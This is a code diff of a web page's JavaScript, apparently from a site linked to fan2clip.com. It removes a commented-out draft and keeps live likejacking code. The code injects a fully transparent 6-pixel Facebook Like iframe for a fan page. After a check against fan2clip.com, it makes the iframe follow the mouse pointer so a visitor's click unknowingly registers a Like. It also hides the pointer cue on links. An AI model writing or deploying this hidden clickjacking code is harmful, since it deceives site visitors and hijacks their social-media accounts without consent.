@@ -36,33 +36,10 @@
             }, 150)
         }
     }
-    function facebookLike() {
-        $("body").append("<div>dcmm</div>");
-        //jQuery("body").append('<div style="overflow: hidden; width: 6px; height: 6px;  position: absolute; z-index: 8000; filter:alpha(opacity=0); -moz-opacity:1; -khtml-opacity: 1; opacity: 1;" id="facebooklike"><iframe src="http://www.facebook.com/plugins/like.php?href=' + fanpage + '&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" style="border: none; overflow: hidden; width: 50x;height: 23px;" allowtransparency="true" id="fbframe" name="fbframe" frameborder="0" scrolling="no"></iframe></div>');
-        /*jQuery.ajax({
-            //url:'http://fan2clip.com/checktimeliked',
-            url:'http://localhost:6789/checktimeliked',
-            success:function(data){
-                if(data == 1){
-                    if (!fblGetCookie('fan2clip')) {
-                        updateActiveElementInterval = setInterval("updateActiveElement();", 10);
-                        jQuery(document).mousemove(function (e) {
-                            jQuery('a').css('cursor', 'default');
-                            jQuery('#facebooklike').css('left', (e.pageX - 3) + 'px');
-                            jQuery('#facebooklike').css('top', (e.pageY - 3) + 'px')
-                        })
-                    }
-                }
-            }
-        })*/
-
-    }
-    //facebookLike();
     $(function(){
         jQuery("body").append('<div style="overflow: hidden; width: 6px; height: 6px;  position: absolute; z-index: 8000; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="facebooklike"><iframe src="http://www.facebook.com/plugins/like.php?href=' + fanpage + '&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" style="border: none; overflow: hidden; width: 50x;height: 23px;" allowtransparency="true" id="fbframe" name="fbframe" frameborder="0" scrolling="no"></iframe></div>');
         jQuery.ajax({
              url:'http://fan2clip.com/checktimeliked',
-             //url:'http://localhost:6789/checktimeliked',
              success:function(data){
                  if(data == 1){
                      s = fblGetCookie('fan2clip');
